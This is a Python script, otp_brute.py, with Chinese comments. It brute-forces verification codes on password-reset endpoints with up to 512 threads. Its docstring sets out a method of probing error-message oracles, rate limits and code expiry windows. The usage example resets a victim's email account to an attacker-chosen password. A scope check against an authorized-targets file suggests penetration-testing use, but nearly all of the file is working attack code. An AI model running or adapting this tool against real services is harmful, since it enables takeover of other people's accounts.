#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""otp_brute.py — 验证码/动态码并发爆破（带 oracle 判定与进度）

前置纪律（先跑完这三步再爆）：
  1) 三态 oracle：不存在的收件人 vs 刚发过码的收件人，错误文案是否不同
  2) 限流探测：连打 200 次错误码，看是否出现"频繁/锁定"
  3) 窗口测量：发码后按时间点采样，看"错误"何时变"已过期"
  然后算：1000000 / 实测QPS 是否 < 窗口秒数，超了就换思路（复用/跨账号/可预测）

用法:
  python otp_brute.py --url https://api/x/resetPassword \
      --param 'email=VICTIM@x.com&passwd=Abcd1234&confirm_passwd=Abcd1234&code={code}' \
      --hit-if-not '验证码错误' --threads 64 --digits 6

  # 只测窗口/限流
  python otp_brute.py --url ... --param '...code={code}' --probe-only
"""
import argparse
import sys
import threading
import time
from concurrent.futures import FIRST_COMPLETED, ThreadPoolExecutor, wait

from scope_guard import require_allowed

for _stream in (sys.stdout, sys.stderr):
    try:
        _stream.reconfigure(encoding="utf-8", errors="replace")
    except (AttributeError, OSError):
        pass

try:
    import requests
    import urllib3
except Exception:
    requests = None
    urllib3 = None

UA = {"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)",
      "Accept": "application/json, text/plain, */*"}


class State:
    def __init__(self):
        self.lock = threading.Lock()
        self.done = 0
        self.hit = None
        self.seen = {}
        self.t0 = time.time()
        self.stop = False


def build(url, param_tpl, code, extra_headers):
    q = param_tpl.replace("{code}", code)
    data = {}
    for kv in q.split("&"):
        if "=" in kv:
            k, v = kv.split("=", 1)
            data[k] = v
    return url, data


def attempt(sess_kwargs, url, data, headers, timeout):
    r = requests.post(url, data=data, headers=headers, timeout=timeout, **sess_kwargs)
    return r.text[:400]


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", required=True)
    ap.add_argument("--param", required=True, help="表单模板，用 {code} 占位")
    ap.add_argument("--hit-if-not", default="验证码错误", help="响应不含该串即视为命中")
    ap.add_argument("--threads", type=int, default=64)
    ap.add_argument("--digits", type=int, default=6)
    ap.add_argument("--start", type=int, default=0)
    ap.add_argument("--end", type=int, default=0, help="0 = 10^digits")
    ap.add_argument("--timeout", type=float, default=15)
    ap.add_argument("--probe-only", action="store_true", help="只跑 200 次限流探测")
    ap.add_argument("--insecure", action="store_true", help="关闭 TLS 证书校验")
    ap.add_argument("--header", default="", help="额外头，k:v;k2:v2")
    ap.add_argument("--scope-config", help="AUTHORIZED-TARGETS.json 路径")
    a = ap.parse_args()
    if requests is None:
        ap.error("需要 requests：python -m pip install -r requirements.txt")
    try:
        require_allowed(a.url, "exploit", a.scope_config)
    except (ValueError, PermissionError) as exc:
        ap.error("scope denied: %s" % exc)

    end = a.end or (10 ** a.digits)
    if a.threads < 1 or a.threads > 512:
        ap.error("--threads must be between 1 and 512")
    if a.digits < 1 or a.digits > 12:
        ap.error("--digits must be between 1 and 12")
    if a.start < 0 or end <= a.start:
        ap.error("invalid --start/--end range")
    sess_kwargs = {"verify": not a.insecure}
    if a.insecure and urllib3 is not None:
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    headers = dict(UA)
    if a.header:
        for kv in a.header.split(";"):
            if ":" in kv:
                k, v = kv.split(":", 1)
                headers[k.strip()] = v.strip()

    st = State()
    print("[+] 目标   : %s" % a.url)
    print("[+] 区间   : %d .. %d  (%d 个)" % (a.start, end - 1, end - a.start))
    print("[+] 命中判据: 响应不含 %r" % a.hit_if_not)
    print("[+] 并发   : %d" % a.threads)

    def work(i):
        if st.stop:
            return
        code = str(i).zfill(a.digits)
        url, data = build(a.url, a.param, code, headers)
        try:
            body = attempt(sess_kwargs, url, data, headers, a.timeout)
        except Exception as e:
            with st.lock:
                st.seen["ERR:" + str(e)[:30]] = st.seen.get("ERR:" + str(e)[:30], 0) + 1
            return
        with st.lock:
            st.done += 1
            if a.hit_if_not not in body:
                st.hit = (code, body)
                st.stop = True
                print("\n*** HIT code=%s" % code)
                print("    resp: %s" % body[:300])
                return
            key = body[:60]
            st.seen[key] = st.seen.get(key, 0) + 1
            if st.done % 500 == 0:
                el = time.time() - st.t0
                qps = st.done / el if el else 0
                left = (end - a.start - st.done) / qps if qps else 0
                print("[%7d] %.0f/s  eta=%.0fs  %s" % (st.done, qps, left, key[:50]))

    if a.probe_only:
        a.end = a.start + 200
        end = a.end
        print("[!] 限流探测模式：只打 200 次\n")

    t0 = time.time()
    ex = ThreadPoolExecutor(max_workers=a.threads)
    pending = set()
    numbers = iter(range(a.start, end))
    try:
        for _ in range(min(a.threads * 2, end - a.start)):
            pending.add(ex.submit(work, next(numbers)))
        while pending and not st.stop:
            done, pending = wait(pending, return_when=FIRST_COMPLETED)
            for future in done:
                future.result()
                if st.stop:
                    break
                try:
                    value = next(numbers)
                except StopIteration:
                    continue
                pending.add(ex.submit(work, value))
    finally:
        for future in pending:
            future.cancel()
        ex.shutdown(wait=True, cancel_futures=True)
    el = time.time() - t0
    print("\n=== 结果 ===")
    print("  完成  : %d" % st.done)
    print("  耗时  : %.1fs   吞吐 %.1f/s" % (el, st.done / el if el else 0))
    print("  命中  : %s" % (st.hit[0] if st.hit else "无"))
    print("  响应分布:")
    for k, v in sorted(st.seen.items(), key=lambda x: -x[1])[:6]:
        print("    %6d  %s" % (v, k))
    if a.probe_only:
        print("\n[判定] 若全部同一文案且无『频繁/锁定』 => 无限流，可进入爆破")


if __name__ == "__main__":
    main()
